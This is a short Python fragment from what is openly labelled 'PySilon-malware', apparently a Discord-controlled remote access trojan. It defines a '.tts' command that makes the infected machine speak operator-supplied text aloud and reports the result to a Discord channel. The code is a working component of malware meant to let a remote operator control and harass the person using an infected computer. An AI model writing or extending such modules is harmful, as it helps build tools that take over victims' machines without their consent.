import pyttsx3
# end of imports

# on message
elif message.content[:4] == '.tts':
    if not message.content[5:]:
        embed = discord.Embed(title="📛 Error",description='```Improper message format!\nExample: .tts Hello World!```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
    else:
        requested_tts = message.content[5:]
        engine = pyttsx3.init()
        engine.say(requested_tts)
        engine.runAndWait()
        engine.stop()
        embed = discord.Embed(title="🟢 Success",description=f'Successfully played TTS message (*{requested_tts}*)', colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
